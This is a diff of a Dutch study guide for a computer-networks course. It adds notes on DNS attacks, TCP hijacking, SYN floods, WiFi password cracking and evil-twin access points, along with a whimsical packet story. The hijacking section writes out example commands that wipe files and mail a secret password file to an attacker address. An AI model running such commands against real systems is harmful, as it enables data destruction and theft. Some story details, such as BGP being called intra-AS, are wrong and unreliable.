@@ -161,7 +161,41 @@ Overzicht van de hoofdstukken die bestudeerd moeten worden voor aanvang van de l
 
 ## Life Of A Packet
 
-## Chapter 1
+::: details De magische reis van Franky
+  Natuurlijk, hier is de aangepaste versie met de toevoegingen:
+
+  Eens, in de uitgestrekte wereld van cyberspace, leefde een klein maar vastberaden pakketje genaamd **Franky**. Franky kwam van **Host A**, een bruisende hub van digitale activiteit, en had dromen om **Host B** te bereiken, een verre bestemming gehuld in mysterie.
+
+  Terwijl Franky aan zijn reis begon, ontmoette hij het **TCP/IP-model**, een imposante structuur die hem door de ingewikkelde paden van het internet leidde. Elke laag van het model omhulde Franky als lagen van een harnas, hem beschermend tegen de gevaren van het digitale rijk.
+
+  **Encapsulation**, een magisch proces, omhulde Franky binnen een beschermende schil, hem afschermend van de chaos van de buitenwereld. Met elke laag die hij doorliep, werd Franky's doel duidelijker en groeide zijn vastberadenheid.
+
+  Navigerend door het web, struikelde Franky over **HTTP**, een vriendelijk protocol dat hem met open armen verwelkomde. Met de begeleiding van HTTP doorkruiste Franky het uitgestrekte netwerk van onderling verbonden websites, elk een nieuw avontuur dat wachtte om ontdekt te worden.
+
+  Maar de reis van Franky was verre van voorbij. Onderweg kwam hij **DNS** tegen, een wijze gids die geheimen fluisterde over domeinnamen en IP-adressen. Met de hulp van DNS vond Franky zijn weg door het labyrint van servers en routers, steeds dichter bij zijn bestemming komend met elke stap.
+
+  **SMTP**, een ijverige boodschapper, hielp Franky communiceren met andere pakketjes onderweg, ervoor zorgend dat zijn berichten zonder fouten hun beoogde ontvangers bereikten. Met SMTP aan zijn zijde voelde Franky een gevoel van kameraadschap in de uitgestrektheid van de digitale wereld.
+
+  Terwijl Franky dieper doordrong in de lagen van het internet, ontmoette hij **TCP** en **UDP**, twee formidabele strijders die verschillende paden naar zijn bestemming boden. TCP, een standvastige beschermer, zorgde voor betrouwbare gegevensoverdracht, terwijl UDP, een snelle boodschapper, snelheid boven alles prioriteerde.
+
+  In de **applicatielaag** leerde Franky de kunst van efficiënte communicatie, de nuances van stroombeheer en schatting van de heen-en-terug-reistijd beheersen. Met deze vaardigheden kon hij zich aanpassen aan de altijd veranderende stromingen van de digitale oceaan, met gemak door turbulente wateren navigeren.
+
+  Maar de weg vooruit was bezaaid met gevaren. Terwijl Franky de **netwerklaag** naderde, stond hij voor de ontmoedigende uitdagingen van routing en adressering. In het hart van een router aanschouwde Franky de ingewikkelde dans van in-/uitvoerpoortverwerking en bestemmingsgerichte doorsturing, zich verwonderend over de complexiteit van de innerlijke werking van het netwerk.
+
+  **IPv4-adressering**, **NAT**, **DHCP** en **subnetting** onthulden zichzelf naarmate Franky dieper doordrong in de netwerklaag, elk een vitaal onderdeel in het groots ontwerp van het internet. Met de **DORA**-dans van DHCP als gids verwierf Franky de nodige middelen om zijn reis voort te zetten, zijn kracht aanvullend voor de weg die voor hem lag.
+
+  In de **controlelaag** van het netwerk stuitte Franky op **routingsalgoritmen** zoals **LS** en **DV**, die elk een ander pad naar zijn bestemming boden. **Intra-AS** routeprotocollen zoals **OSPF** en **BGP** verlichtten de weg vooruit, Franky door het ingewikkelde doolhof van netwerktopologie leidend.
+
+  Terwijl Franky zijn bestemming naderde, verwonderde hij zich over de wonderen van **netwerkbeheer**, waar **SNMP** en **SDN** onvermoeibaar werkten om orde te handhaven in het digitale rijk. Met hun hulp kon Franky elke hindernis overwinnen die zich op zijn weg bevond, voortgaand met onwrikbare vastberadenheid.
+
+  En zo ging de reis van Franky verder, elke technologie als zijn gids, een testament van de veerkracht en vindingrijkheid van pakketjes overal. Hoewel de weg vooruit lang en onzeker was, drukte Franky door, zijn geest ongebroken en zijn vastberadenheid onwankelbaar. Want in de uitgestrektheid van cyberspace was er altijd een nieuw avontuur dat wachtte om ontdekt te worden, en Franky was klaar om het met beide handen aan te grijpen.
+
+  Daarnaast, terwijl Franky zijn reis voortzette, ontdekte hij ook het **segmentatie**, **datagram** en **frame**, de bouwstenen van zijn digitale wereld. Elk speelde een cruciale rol in het veilig en efficiënt transporteren van zijn gegevens door het netwerk, waardoor Franky met vertrouwen zijn weg kon vervolgen.
+
+  Aanvullend op zijn avontuur leerde Franky over **cookies**, **webcaching**, **POP**, **IMAP**, **socket-programmering**, **UDP** en **TCP**, **pariteitscontroles**, **checksumming-methoden**, **CRC**, en **ARP**. Elke technologie verrijkte zijn kennis en stelde hem in staat om de complexe wereld van het internet met meer inzicht en vaardigheid te navigeren.
+:::
+
+## `Chapter 1`
 
 ### Computer Networks and the Internet
 
@@ -435,7 +469,7 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
        - Verschillende vormen van malware, zoals virussen, wormen, spyware en ransomware, vormen een voortdurende bedreiging voor netwerkbeveiliging.
   :::
 
-## Chapter 2
+## `Chapter 2`
 
 ### Application Layer
 
@@ -827,9 +861,11 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
   - **2.4.4** DNS Attack & Security
     ::: details Antwoord
     **DNS in DDOS-aanvallen**
+    **DNS in DDoS-aanvallen**
 
-    1. Aanvaller stuurt kleine DNS-verzoeken met vervalst bron-IP, vraagt maximale informatie over zone.
-    2. Voor elk verzoek ontvangt doelwit grote hoeveelheid informatie.
+    1. DNS-servers kunnen worden misbruikt bij DDoS (Distributed Denial of Service) -amplificatieaanvallen.
+    2. Aanvaller stuurt kleine DNS-verzoeken met vervalst bron-IP, vraagt maximale informatie over zone.
+    3. Voor elk verzoek ontvangt doelwit grote hoeveelheid informatie.
 
     **DNS-hijacking**
 
@@ -841,11 +877,24 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
 
     - Privacy
     - DNS is niet versleuteld: iedereen kan meeluisteren (provider, hacker, iedereen).
-    - Oplossing?
+
     - DNS over HTTPS/SSL:
       - Browsermakers (Google, Mozilla) implementeren dit.
     - Maar...
       - In plaats van dat iedereen toegang heeft tot je gegevens, worden ze nu verzameld door één specifieke DNS-provider.
+
+    **Nay-sayers**
+    Mensen vinden DNS over HTTPS/SSL geen goed protocol vanwege verschillende redenen:
+
+    1. **Centralisatie van gegevens**: Met DNS over HTTPS/SSL worden alle DNS-verzoeken naar een specifieke DNS-provider gestuurd, wat resulteert in een centralisatie van gegevens. Dit kan leiden tot zorgen over privacy en gegevensbeveiliging, aangezien alle DNS-activiteit bij één entiteit wordt geconcentreerd.
+
+    2. **Verlies van diversiteit**: Het gebruik van één specifieke DNS-provider kan leiden tot een verlies van diversiteit in het DNS-ecosysteem. Dit kan problemen veroorzaken, zoals afhankelijkheid van één enkele entiteit voor DNS-diensten, wat de veerkracht van het internet kan verminderen.
+
+    3. **Potentiële monopoliepositie**: Als een enkele DNS-provider de dominante positie verwerft in het aanbieden van DNS over HTTPS/SSL-diensten, kan dit leiden tot een monopoliepositie. Dit kan leiden tot bezorgdheid over machtsmisbruik en controle over internetverkeer.
+
+    4. **Complexiteit voor beheerders**: Voor netwerkbeheerders kan het beheren van DNS-verzoeken via HTTPS/SSL ingewikkelder zijn dan traditionele DNS-protocollen. Dit kan extra overhead en uitdagingen met zich meebrengen bij het beheren en monitoren van DNS-verkeer.
+
+    Al deze zorgen kunnen bijdragen aan het wantrouwen tegenover DNS over HTTPS/SSL als een DNS-protocol, ondanks de verbeterde beveiligingsfuncties die het biedt.
 
     **DNSSec**
 
@@ -920,7 +969,7 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
 
     :::
 
-## Chapter 3
+## `Chapter 3`
 
 ### Transport Layer
 
@@ -934,7 +983,7 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
 
     1. - **Sending Side:** Deelt applicatieberichten op in segmenten en geeft ze door aan de network layer.
 
-    2.- **Receiving Side:** Herschikt segmenten tot berichten en geeft ze door aan de application layer.
+    2. - **Receiving Side:** Herschikt segmenten tot berichten en geeft ze door aan de application layer.
 
     **Implementatie van Transportlaagprotocollen:**
 
@@ -1253,12 +1302,86 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
     De evolutie van transportlaagfunctionaliteit weerspiegelt de dynamische aard van netwerkcommunicatie. Van basisgegevensoverdracht tot geavanceerde protocollen die zorgen voor betrouwbaarheid, efficiëntie en beveiliging, blijft de transportlaag zich aanpassen aan de voortdurend veranderende eisen van de digitale wereld.
     :::
 
-- **3.9** 26 TCP loss scenario
+- **3.9** TCP loss scenario
     ::: details Antwoord
     Als de correcte ontvangst niet op tijd wordt bevestigd, worden de gegevens opnieuw verzonden.
     :::
 
-## Chapter 4
+- **3.9** TCP Retransmission
+    ::: details Antwoord
+    **TCP Retransmissie**
+
+    TCP-retransmissie is een mechanisme in het Transmission Control Protocol (TCP) om verloren gegevenspakketten te herstellen door ze opnieuw te verzenden als ze niet correct zijn ontvangen door de ontvanger.
+
+    **Betrouwbaarheid Verzekeren**
+
+    Dit proces zorgt ervoor dat alle verzonden gegevenspakketten uiteindelijk aankomen, zelfs als er problemen optreden tijdens de overdracht, waardoor de betrouwbaarheid van TCP-netwerken wordt gegarandeerd.
+
+    **Timeout en Herverzending**
+
+    Wanneer een zender geen bevestiging (ACK) ontvangt binnen een bepaalde tijd, wordt het pakket als verloren beschouwd en opnieuw verzonden, waardoor eventuele vertragingen of fouten in het netwerk worden gecompenseerd.
+    <img src="./assets/afbeeldingen/tcp-retransmission.png">
+    :::
+
+- **3.10** TCP Hijacking
+    ::: details Antwoord
+    Een TCP-verbinding tussen twee hosts wordt gedefinieerd door:
+
+  - De bron- en bestemmings-IP-adressen en poortnummers
+  - De sequentienummers en bevestigingsnummers
+
+    Als we deze informatie kunnen vinden, kunnen we de verbinding overnemen. Hoe?
+
+  - Het opvangen van netwerkverkeer (bijv. )
+  - Raden
+  - Er is een reden waarom SYN- en ACK-nummers niet bij 1 beginnen
+  - Maar veel TCP-implementaties genereren ze nog steeds niet echt willekeurig
+    We kunnen zo vaak raden als we willen.
+
+    **Om aan te vallen:**
+
+    1. Schakel host A uit of vertraag deze (gebruik misschien een DOS-aanval), zodat A niet kan antwoorden
+    2. Stuur je eigen pakket naar host B, waarbij je het IP-adres vervalst
+    3. Nu kun je gegevens naar host B sturen, terwijl host A nooit kan resynchroniseren
+
+    Dus nu kun je valse gegevens naar host B sturen, maar geen antwoord krijgen (herinner je je het valse bron-IP-adres?). Is dit een groot probleem?
+
+    TCP-segmenten dragen toepassingsgegevens. Als we hadden:
+
+  - Een open telnet-sessie, kunnen we opdrachten sturen: `rm -rf`, of `sendmail hacker@email.com < secret_password_file`
+  - Een open HTTP-sessie, kunnen we formuliergegevens posten, transacties uitvoeren
+  - Een open FTP-sessie, kunnen we bestanden / malware verzenden
+    :::
+
+    **3.11** TCP SYN Flood DOS-aanval
+    ::: details Antwoord
+    Een SYN-flood is een type Denial of Service (DOS) -aanval:
+    1. De aanvaller stuurt een groot aantal SYN-verzoeken naar de server.
+    2. De server reserveert resources voor elk ontvangen SYN-verzoek.
+    3. De aanvaller voltooit echter nooit de TCP-handshake om de verbindingen te voltooien.
+    4. Na verloop van tijd bereikt de server het maximale aantal verbindingen dat het kan verwerken.
+    5. Hierdoor kan de server geen nieuwe, legitieme verbindingen meer accepteren.
+
+    **Serverreactie en Aanvalstechniek**
+
+    De server wacht niet eeuwig op het voltooien van de verbinding en zal na verloop van tijd resources vrijmaken. De aanvaller blijft echter nieuwe SYN-verzoeken sturen om de server bezig te houden, waardoor deze onbruikbaar wordt voor legitiem verkeer.
+    :::
+
+    **3.12** TCP SYN Flood DOS-defense
+    ::: details Antwoord
+    **SYN-cache**
+    - Bewaar alleen de meest relevante verbindingsinformatie in een zeer efficiënte cache.
+    - Reserveer volledige resources pas nadat de verbinding is tot stand gebracht.
+
+    **SYN-cookies**
+    - Sla geen verbindingsinformatie op (TCB = transmission control block).
+    - Een SYN-cookie is een geheim code, gebaseerd op IP-adressen, poortnummers, tijd en maximale segmentgrootte.
+    - De server gebruikt deze waarde als het initiële volgnummer.
+    - Als de client inderdaad de verbinding voltooit, wordt deze waarde (+1) geretourneerd als het bevestigingsnummer!
+    - Kan geen geavanceerde informatie opslaan.
+    :::
+
+## `Chapter 4`
 
 ### The Network Layer: Data Plane
 
@@ -1284,15 +1407,8 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
   Het onderscheid tussen gegevensvlak- en controlevlakfuncties is cruciaal om te begrijpen. Dit moderne perspectief helpt bij het structureren van je begrip van de netwerklaag.
   :::
 
-  - **4.1.1** Forwarding and Routing: The Data anpmnd Control Planes
+  - **4.1.1** Forwarding and Routing: The Data Control Planes
     ::: details Antwoord
-    **Routing en Forwarding**
-
-    - **Routing:**
-      - Bepaal het "beste" pad naar het eindpunt.
-    - **Forwarding:**
-      - Stuur een inkomend packet naar de juiste link, op basis van dat 'beste' pad.
-
     **Twee belangrijke network-layer functies**
 
     - **Forwarding:**
@@ -1567,7 +1683,7 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
 
   :::
 
-## Chapter 5
+## `Chapter 5`
 
 ### The Network Layer: Control Plane
 
@@ -1795,46 +1911,338 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
   
 - **5.8** Summary
 
-## Chapter 6
+## `Chapter 6`
 
 ### The Link Layer and LANs
 
 - **6.1** Introduction to the Link Layer
+  ::: details Antwoord
+  **Link Layer: Introductie**
+
+  **Terminologie:**
+  - **Nodes:** Hiermee worden zowel hosts als routers aangeduid.
+  - **Links:** Communicatiekanalen die nodes met elkaar verbinden.
+  - **Wired Links:** Fysieke bekabelde verbindingen.
+  - **Wireless Links:** Draadloze verbindingen.
+  - **LANs:** Local Area Networks, waarin de link layer opereert.
+  - **Link Layer Packet:** Ook bekend als een frame, dit omhult een datagram.
+
+  **Link layer: switches vs routers**
+  Routers verbinden een netwerk en gebruiken daarvoor IP adressen (Network layer).
+  Switches maken een netwerk en gebruiken daarvoor MAC-adressen (Link layer).
+  MAC = Media Access Control, het unieke hardware adres van een apparaat.
+  Een apparaat kan meerdere MAC en IP adressen hebben, voor type verbinding één.
+  :::
+
   - **6.1.1** The Services Provided by the Link Layer
-  - **6.1.2** Where Is the Link Layer Implemented?
+   ::: details Antwoord
+  - **Framing, link access:**
+    - Verpakt een datagram in een frame en voegt een header en trailer toe.
+    - MAC-adressen worden gebruikt om de bron en bestemming te identificeren.
+    - ARP-request wordt gebruikt om het MAC-adres op te vragen van een IP-adres.
+  - **Betrouwbare levering tussen nodes:**
+    - Werkt met acknowledge en resend mechanismen.
+    - Zelden gebruikt op verbindingen met weinig fouten, zoals bedrade verbindingen.
+    - Draadloze verbindingen: hoge foutpercentages.
+  - **Flow control:**
+    - Regelt de snelheid van gegevensverzending tussen nodes.
+  - **Error detection**:
+    - Detecteert fouten veroorzaakt door ruis of externe storingen.
+    - Als een fout wordt gedetecteerd, wordt om herzending gevraagd of wordt het frame verworpen.
+  - **error correction:**
+    - De ontvanger herkent en corrigeert fouten in de verzending.
+  - **Half-duplex en full-duplex:**
+    - In half-duplex kunnen beide nodes verzenden, maar niet tegelijkertijd.
+    - In full-duplex kunnen beide nodes gelijktijdig verzenden.
+
+    **Linklaag: switches versus routers**
+
+    - **Routers** verbinden netwerken en maken gebruik van IP-adressen (Netwerklaag).
+    - **Switches** creëren een netwerk en maken gebruik van MAC-adressen (Linklaag).
+    - **MAC** staat voor Media Access Control, het unieke hardwareadres van een apparaat.
+    - Een apparaat kan meerdere MAC- en IP-adressen hebben, maar één voor elke verbindingstype.
+
+    <img src="./assets/afbeeldingen/mac-address.png">
+   :::
+
+  - **6.1.2** Link Frames
+    ::: details Antwoord
+    <img src="./assets/afbeeldingen/frames.png">
+    :::
+
+  - **6.1.3** Where Is the Link Layer Implemented?
+    ::: details Antwoord
+    - In elke host.
+    - Op de netwerkadapter of een chip.
+    - Ethernetkaart, 802.11-kaart; Ethernet-chipset.
+    - Implementeert de link- en fysieke laag.
+    - Gevestigd op de systeembus.
+    - Een combinatie van hardware, software en firmware.
+
+    <img src="./assets/afbeeldingen/waar-is-de-linklaag.png.png">
+    :::
+
+  - **6.1.3** How do adapters communicate?
+    ::: details Antwoord
+    Adapters communiceren door gegevens te verzenden en ontvangen via de fysieke verbindingen van een netwerk., software en firmware via frames.
+
+    ontvanger zoek naar errors en pakt datagram uit de frame
+
+    <img src="./assets/afbeeldingen/hoe-communiceren-adapters.png">
+    :::
+
 - **6.2** Error-Detection and -Correction Techniques
+  ::: details Antwoord
+  - **EDC**: Error Detection and Correction bits (redundancy)
+  - **D**: Data is beschermd tegen fouten, geldt soms ook voor headers.
+    - Error detectie niet 100% betrouwbaar!
+    - Protocol kan sommige fouten niet opsporen.
+    - Groter EDC-veld zorgt voor meer kans op opsporen van fouten.
+
+    <img src="./assets/afbeeldingen/error-detection.png">
+  :::
+
   - **6.2.1** Parity Checks
+  ::: details Antwoord
+  - **Even pariteit**: Een extra bit wordt toegevoegd aan de gegevens om het aantal enen in een gegevensreeks even te maken.
+  - **Oneven pariteit**: Een extra bit wordt toegevoegd om het aantal enen oneven te maken.
+  - Bij ontvangst wordt de pariteit opnieuw berekend en vergeleken met de ontvangen waarde om fouten te detecteren.
+  - Eenvoudig en effectief voor het dFetecteren van enkele bitfouten, maar niet voor het corrigeren ervan.
+
+  <img src="./assets/afbeeldingen/parity-checking.png">
+  :::
+
+  - **6.2.1.5** Two Dimensional Parity
+  ::: details Antwoord
+  **Tweedimensionale Pariteitscontrole**
+
+  - **Pariteitsbit per rij en kolom**: Elke rij en kolom in een blok gegevens krijgt een eigen pariteitsbit.
+  - Bij verzending wordt de pariteit voor elke rij en elke kolom berekend en toegevoegd aan de verzonden gegevens.
+  - Bij ontvangst worden de pariteitsbits opnieuw berekend voor elke rij en elke kolom. Als een fout wordt gedetecteerd, kan de rij en/of kolom waarin de fout is opgetreden, worden geïdentificeerd.
+  - Hierdoor kunnen niet alleen enkelvoudige bitfouten, maar ook sommige meervoudige bitfouten worden gedetecteerd.
+
+  <img src="./assets/afbeeldingen/two-dimensional-parity-checking.png">
+  :::
+
   - **6.2.2** Checksumming Methods
+  ::: details Antwoord
+  Checksumming-methoden worden gebruikt om fouten in gegevensoverdracht te detecteren door een checksumwaarde te berekenen en te vergelijken met de ontvangen checksum.
+  :::
+
   - **6.2.3** Cyclic Redundancy Check (CRC)
+  ::: details Antwoord
+  CRC (Cyclic Redundancy Check) is een foutdetectiemethode waarbij een specifieke veelterm wordt toegepast op de gegevens, resulterend in een restwaarde die aan het bericht wordt toegevoegd en bij de ontvanger opnieuw wordt berekend om fouten te detecteren.
+  :::
+
 - **6.3** Multiple Access Links and Protocols
+  ::: details Antwoord
+  Multiple Access Links zijn communicatiekanalen waarmee meerdere zenders toegang hebben tot hetzelfde kanaal. Protocollen voor meerdere toegangen regelen de toegang tot deze gedeelde links, waarbij verschillende methoden worden gebruikt, zoals TDMA, FDMA en CDMA, om conflicten tussen zenders te minimaliseren en de efficiëntie van de kanaaltoewijzing te verbeteren.
+  :::
+
   - **6.3.1** Channel Partitioning Protocols
+    ::: details Antwoord
+    Kanaalpartitieprotocollen verdelen het beschikbare kanaal in verschillende delen, waarbij elk deel wordt toegewezen aan een specifieke gebruiker of groep gebruikers. Dit omvat protocollen zoals TDMA (Time Division Multiple Access) en FDMA (Frequency Division Multiple Access), die respectievelijk tijd- en frequentiesleuven toewijzen aan verschillende gebruikers, waardoor ze gelijktijdig kunnen communiceren zonder interferentie.
+    :::
+
   - **6.3.2** Random Access Protocols
+    ::: details Antwoord
+    Random Access-protocollen laten gebruikers toe om willekeurig toegang te krijgen tot het gedeelde communicatiekanaal zonder voorafgaande coördinatie. Voorbeelden zijn het Aloha-protocol en het CSMA (Carrier Sense Multiple Access)-protocol, waarbij zenders het kanaal controleren op activiteit voordat ze gegevens verzenden, wat helpt om botsingen te minimaliseren en de efficiëntie van het kanaal te verbeteren.
+    :::
+
   - **6.3.3** Taking-Turns Protocols
+    ::: details Antwoord
+    Taking-Turns Protocols zijn netwerktoegangsprotocollen waarbij nodes om beurten toestemming krijgen om het communicatiemedium te gebruiken.
+    :::
+
   - **6.3.4** DOCSIS: The Link-Layer Protocol for Cable Internet Access
+    ::: details Antwoord
+
+    :::
+
 - **6.4** Switched Local Area Networks
+  ::: details Antwoord
+  Switched Local Area Networks zijn lokale netwerken waarin switches worden gebruikt om gegevenspakketten efficiënt tussen apparaten te routeren, waardoor de prestaties en betrouwbaarheid van het netwerk worden verbeterd.
+  :::
+
   - **6.4.1** Link-Layer Addressing and ARP
+    ::: details Antwoord
+
+    :::
+
   - **6.4.2** Ethernet
+    ::: details Antwoord
+    **Ethernet**
+
+    Ethernet is de dominante bekabelde LAN-technologie die eenvoudig en goedkoop is en de snelheidsrace heeft bijgehouden, variërend van 10 Mbps tot 10 Gbps.
+
+    **Ethernet Frame**
+
+    Een Ethernet-frame omvat een preamble voor synchronisatie, bron- en bestemmings-MAC-adressen, het type (meestal IP), gegevens met het IP-datagram en een CRC voor foutdetectie.
+
+    **Collision Domains**
+
+    Collision domains beperken de prestaties doordat slechts één host tegelijk kan verzenden, en een bus- of stertopologie kan worden gebruikt, waarbij de laatste de voorkeur heeft vanwege zijn verbeterde prestaties.
+    :::
+
   - **6.4.3** Link-Layer Switches
-  - **6.4.4** Virtual Local Area Networks (VLANs)
+    ::: details Antwoord
+    **Switch: Multiple Simultaneous Transmissions**
+
+    **Hosts hebben een toegewijde, directe verbinding met de switch.**
+
+    **Switches bufferen pakketten.**
+
+    **Ethernet-protocol wordt gebruikt op elke inkomende link, maar er zijn geen botsingen; volledige duplex.**
+
+    **Elke link is zijn eigen botsingsdomein.**
+
+    **Switching maakt het mogelijk dat A naar A' en B naar B' tegelijkertijd kunnen verzenden, zonder botsingen.**
+
+    **Switch Forwarding Table**
+
+    **Hoe weet de switch dat A' bereikbaar is via interface 4 en B' bereikbaar is via interface 5?**
+
+    **Elke switch heeft een switchtabel, waarin elke invoer bestaat uit het MAC-adres van de host, de interface om de host te bereiken en een tijdstempel. Dit lijkt op een routeringstabel. Maar hoe worden deze invoeren gemaakt en onderhouden in de switchtabel?**
+
+    **Switch: Zelflerend**
+
+    **De switch leert welke hosts bereikbaar zijn via welke interfaces.**
+
+    **Wanneer een frame wordt ontvangen, 'leert' de switch de locatie van de afzender.**
+
+    **De switch registreert het afzender/locatie-paar in de switchtabel.**
+
+    **Switches maken geen gebruik van ARP.**
+    :::
+
+- **6.4.4** Virtual Local Area Networks (VLANs)
+    ::: details Antwoord
+
+    :::
+
 - **6.5** Virtualization: A Network as a Link Layer
+   ::: details Antwoord
+
+   :::
+
 - **6.6** Multiprotocol Label Switching (MPLS)
+  ::: details Antwoord
+  MPLS is een geavanceerde technologie die wordt gebruikt in computernetwerken om gegevenspakketten snel en efficiënt door te sturen op basis van labels in plaats van IP-adressen. Het biedt snelle routing en Quality of Service-ondersteuning, waardoor netwerken flexibeler en schaalbaarder worden.
+  :::
+
 - **6.7** Data Center Networking
+  ::: details Antwoord
+
+  :::
+
   - **6.7.1** Data Center Architectures
+    ::: details Antwoord
+
+    :::
+
   - **6.7.2** Trends in Data Center Networking
+    ::: details Antwoord
+
+    :::
+
 - **6.8** Retrospective: A Day in the Life of a Web Page Request
+   ::: details Antwoord
+
+   :::
+
   - **6.8.1** Getting Started: DHCP, UDP, IP, and Ethernet
+    ::: details Antwoord
+
+    :::
+
   - **6.8.2** Still Getting Started: DNS and ARP
+    ::: details Antwoord
+
+    :::
+
   - **6.8.3** Still Getting Started: Intra-Domain Routing to the DNS Server
+    ::: details Antwoord
+
+    :::
+
   - **6.8.4** Web Client-Server Interaction: TCP and HTTP
+    ::: details Antwoord
+
+    :::
+
 - **6.9** Summary
 
-## Chapter 7
+## `Chapter 7`
 
 ### Wireless and Mobile Networks
 
 - **7.1** Introduction
+  ::: details Antwoord
+    **Wireless Networks**
+
+  **Elements of a Wireless Network**
+  - **Wireless hosts**
+  - **Base stations**
+  - **Wireless links**
+
+  **Wireless versus Mobile**
+
+  **Properties of Wireless Links**
+
+  **802.11 (WiFi)**
+
+  **Security in WiFi Networks**
+  - **WiFi Encryption**
+  - **Hacking WiFi**
+  - **WiFi Encryption vs HTTPS**
+  :::
 - **7.2** Wireless Links and Network Characteristics
+  ::: details Antwoord
+  **Wireless Links and Network Characteristics**
+
+  Wireless links are characterized by properties such as signal strength, interference, and attenuation, affecting the reliability and performance of wireless networks.
+  :::
   - **7.2.1** CDMA
+  - **7.2.2** Wireless Security
+    ::: details Antwoord
+    **Afluisteren van Draadloze Verbindingen**
+
+    - WiFi-verbindingen reizen door de lucht en kunnen gemakkelijk worden afgeluisterd door iedereen.
+    - Speciale WiFi-kaarten zijn beschikbaar voor dit doel.
+    - Met tools zoals Wireshark kan alle verzonden data worden opgevangen, inclusief informatie uit de gebruikte protocollen zoals IP- en MAC-adressen.
+    - Daarom is het gebruik van encryptie essentieel!
+
+    **Hacking WEP-wachtwoord in minuten**
+
+    - Luister het WiFi-netwerk af totdat je een aanmeldingsbericht onderschept.
+    - Het onderschepte bericht is versleuteld, dus het wachtwoord is nog onbekend.
+    - Probeer offline aanmeldingsberichten te genereren en probeer één voor één populaire wachtwoorden.
+    - Als het gegenereerde bericht overeenkomt met het afgeluisterde bericht, heb je het wachtwoord gevonden.
+    - Nu kun je je aanmelden op het WiFi-netwerk.
+
+    **WPA2 hacken: brute force**
+
+    1. Luister het WiFi-netwerk af tot je een aanmeldingsbericht onderschept.
+    2. Het onderschepte bericht is versleuteld, dus het wachtwoord is nog onbekend.
+    3. Probeer offline aanmeldingsberichten te genereren en probeer één voor één populaire wachtwoorden.
+    4. Als het gegenereerde bericht overeenkomt met het afgeluisterde bericht, heb je het wachtwoord gevonden.
+    5. Nu kun je je aanmelden op het WiFi-netwerk.
+
+    **De toekomst: WPA3**
+
+    - Beschikbaar sinds 2018, maar nog niet veel gebruikt.
+    - Biedt ad-hoc versleuteling voor openbare WiFi-hotspots.
+    - Biedt extra beveiliging voor gebruikers met zwakke wachtwoorden.
+    - Vergemakkelijkt het verbinden van IoT-apparaten met WiFi-netwerken.
+
+    **Nep-toegangspunten**
+
+    Hackers kunnen hun eigen toegangspunt opzetten, zoals een "Gratis WiFi" op een station of vliegveld, of een "Evil Twin" met hetzelfde SSID als een normaal toegangspunt maar met een sterker signaal. Dit stelt hen in staat om een "man-in-the-middle" te worden en verkeer te onderscheppen, afbeeldingen of woorden te vervangen, SSL-stripping-aanvallen uit te voeren, inloggegevens te verzamelen, en meer.
+
+    **WiFi-versleuteling vs HTTPS**
+
+    HTTPS beveiligt het HTTP-verkeer tussen de client en de webserver, maar alleen voor deze ene website. Andere websites zijn mogelijk niet beveiligd en andere protocollen zijn helemaal niet beveiligd.
+    :::
 - **7.3** WiFi: 802.11 Wireless LANs
   - **7.3.1** The 802.11 Wireless LAN Architecture
   - **7.3.2** The 802.11 MAC Protocol
@@ -1858,3 +2266,222 @@ Het oorspronkelijke doel van ARPANET was om universiteiten te laten communiceren
   - **7.6.2** Mobile IP
 - **7.7** Wireless and Mobility: Impact on Higher-Layer Protocols
 - **7.8** Summary
+
+## `Chapter 8`
+
+### Network Security
+
+- **7.1** Introduction
+  ::: details Antwoord
+    Wat is netwerkbeveiliging?
+  - Vertrouwelijkheid: alleen de verzender en de beoogde ontvanger moeten de inhoud van het bericht "begrijpen". De verzender versleutelt het bericht en de ontvanger decodeert het bericht.
+  - Berichtintegriteit: de verzender en ontvanger willen ervoor zorgen dat het bericht niet wordt gewijzigd (tijdens het transport of daarna) zonder detectie.
+  - Authenticatie: de verzender en ontvanger willen elkaars identiteit bevestigen.
+  - Operationele beveiliging: houd de slechteriken buiten door firewalls en in te zetten.
+  :::
+
+- **7.2** Security Threats
+  ::: details Antwoord
+  Security threats are risks or potential dangers to computer systems, networks, and data. They encompass various forms of attacks and malicious activities aimed at compromising the confidentiality, integrity, or availability of information. Some common security threats include:
+
+  1. Malware: Malicious software such as viruses, worms, Trojans, and ransomware designed to infect and damage systems or steal sensitive information.
+
+  2. Phishing: Deceptive techniques used to trick individuals into revealing personal or confidential information, often through fraudulent emails, messages, or websites.
+
+  3. Denial-of-Service (DoS) Attacks: Attempts to disrupt or overload a system, network, or service, rendering it unavailable to legitimate users.
+
+  4. Man-in-the-Middle (MitM) Attacks: Intercepting and potentially altering communication between two parties without their knowledge or consent.
+
+  5. Insider Threats: Risks posed by individuals within an organization who misuse their access privileges to steal data, sabotage systems, or engage in unauthorized activities.
+
+  6. Social Engineering: Psychological manipulation techniques employed to manipulate individuals into divulging sensitive information or performing actions that compromise security.
+
+  7. Zero-Day Exploits: Attacks that target previously unknown vulnerabilities or weaknesses in software or systems before developers have had the chance to patch or mitigate them.
+
+  8. Data Breaches: Unauthorized access to and exposure of sensitive or confidential data, often resulting in financial loss, reputational damage, or legal consequences.
+
+  9. Advanced Persistent Threats (APTs): Sophisticated and targeted cyberattacks conducted by skilled adversaries with specific objectives, such as espionage or corporate espionage.
+
+  10. Insider Data Theft: Unauthorized copying, transfer, or exfiltration of sensitive data by insiders, including employees, contractors, or partners.
+
+  Understanding and mitigating these security threats is essential for safeguarding digital assets, protecting privacy, and ensuring the integrity and availability of information systems.
+  :::
+
+- **7.2.1** There are bad guys (and girls) out there!
+  ::: details Antwoord
+  **There are Bad Guys (and Girls) Out There!**
+
+    Q: What can a "bad guy" do?  
+    A: A lot! See section 1.6.
+
+  - Eavesdrop: Intercept messages.
+  - Actively insert messages into connection.
+  - Impersonation: Can fake (spoof) source address in packet (or any field in packet).
+  - Hijacking: "Take over" ongoing connection by removing sender or receiver, inserting himself in place.
+  - Denial of Service: Prevent service from being used by others (e.g., by overloading resources).
+  :::
+- **7.2.2** Bad guys: attack server, network infrastructure
+  ::: details Antwoord
